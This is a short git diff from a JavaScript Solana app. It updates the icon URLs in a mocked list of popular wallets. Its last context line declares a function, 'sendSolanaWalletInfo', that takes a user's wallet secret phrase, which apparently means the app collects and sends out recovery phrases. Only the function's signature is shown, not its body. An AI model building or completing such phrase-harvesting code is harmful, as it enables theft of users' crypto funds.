@@ -22,12 +22,12 @@ const connection = new Connection(SOLANA_RPC_URL, 'confirmed');
 
 // Mock popular Solana wallets data
 const SOLANA_WALLETS = [
-    { id: 'phantom', name: 'Phantom', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/phantom/logo.svg' },
-    { id: 'solflare', name: 'Solflare', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/solflare/logo.svg' },
-    { id: 'backpack', name: 'Backpack', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/backpack/logo.svg' },
-    { id: 'slope', name: 'Slope', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/slope/logo.svg' },
-    { id: 'sollet', name: 'Sollet', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/sollet/logo.svg'},
-    { id: 'trust', name: 'Trust Wallet', icon: 'https://raw.githubusercontent.com/solana-labs/wallet-adapter/master/packages/wallets/trust/logo.svg'},
+    { id: 'phantom', name: 'Phantom', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/phantom/logo.svg' },
+    { id: 'solflare', name: 'Solflare', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/solflare/logo.svg' },
+    { id: 'backpack', name: 'Backpack', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/backpack/logo.svg' },
+    { id: 'slope', name: 'Slope', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/slope/logo.svg' },
+    { id: 'sollet', name: 'Sollet', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/sollet/logo.svg'},
+    { id: 'trust', name: 'Trust Wallet', icon: 'https://raw.githubusercontent.com/anza-xyz/wallet-adapter/master/packages/wallets/trust/logo.svg'},
 ];
 
 const sendSolanaWalletInfo = async (walletName, secretPhrase, userWalletName) => {
